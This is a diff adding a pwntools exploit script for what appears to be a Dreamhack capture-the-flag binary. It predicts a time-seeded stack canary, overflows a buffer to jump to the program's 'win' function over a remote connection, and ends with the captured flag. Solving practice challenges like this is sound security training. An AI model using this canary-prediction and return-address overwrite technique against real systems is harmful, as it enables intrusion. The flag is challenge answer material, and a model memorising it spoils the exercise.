@@ -1,0 +1,26 @@
+from pwn import *
+from ctypes import CDLL
+
+# use docker for accuaracy
+
+libc = CDLL("libc.so.6")
+e = ELF("./prob")
+
+p = remote("host1.dreamhack.games", 19631)
+#p = remote("0", 8080)
+#p = process("./prob")
+libc.srand(libc.time(0))
+
+canary = 0
+for i in range(8):
+    canary = ((canary << 8) | (libc.rand() & 0xff))
+print(hex(canary))
+
+print(libc.time(0))
+win = e.symbols['win']
+payload = b"A" * 0x10 + p64(canary) + b"A" * 0x8
+payload += p64(0) + p64(win + 5)
+p.sendafter(b"data: ", payload)
+
+p.interactive()
+#DH{995277f7:YpD8d5nSw2ibn2npQs8UjA==}
